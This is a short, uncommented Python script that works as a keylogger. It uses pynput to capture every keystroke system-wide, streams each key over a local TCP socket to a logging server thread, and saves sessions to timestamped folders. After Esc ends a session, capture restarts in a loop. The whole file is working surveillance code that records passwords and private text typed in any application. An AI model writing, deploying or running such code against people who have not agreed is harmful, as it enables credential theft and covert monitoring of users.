#!/usr/bin/env python3
import os
import time
import threading
import socket
from datetime import datetime
from pynput import keyboard

HOST = '127.0.0.1'
PORT = 65432

def start_server():
    def server_loop():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((HOST, PORT))
            s.listen()
            while True:
                conn, addr = s.accept()
                with conn:
                    data = conn.recv(4096)
                    if data:
                        with open("server_log_simple.txt", "a") as f:
                            f.write(f"{datetime.now()}: {data.decode('utf-8')}\n")
    thread = threading.Thread(target=server_loop, daemon=True)
    thread.start()
    return thread

def send_keystroke(key_text):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.sendall(key_text.encode('utf-8'))
    except ConnectionRefusedError:
        pass

def create_session_folder():
    folder_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    os.makedirs(folder_name, exist_ok=True)
    return folder_name

def save_session(folder_name, keystrokes):
    with open(os.path.join(folder_name, "keystrokes.txt"), "w") as f:
        for i, k in enumerate(keystrokes, 1):
            f.write(f"{i}: {k}\n")
    print(f"[save] session saved to {folder_name}")

def run_single_session():
    keystrokes = []
    session_folder = create_session_folder()
    print(f"[session] simple session started. Saving to {session_folder}")
    def on_press(key):
        try:
            keystrokes.append(key.char)
            send_keystroke(key.char)
        except AttributeError:
            if key == keyboard.Key.esc:
                print("[session] Esc pressed — ending session.")
                return False
            keystrokes.append(str(key))
            send_keystroke(str(key))
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    save_session(session_folder, keystrokes)
    return session_folder, keystrokes

def main_loop():
    start_server()
    try:
        while True:
            run_single_session()
            print("[main] session finished. Restarting in 1 second...")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[main] KeyboardInterrupt: exiting.")

if __name__ == "__main__":
    main_loop()
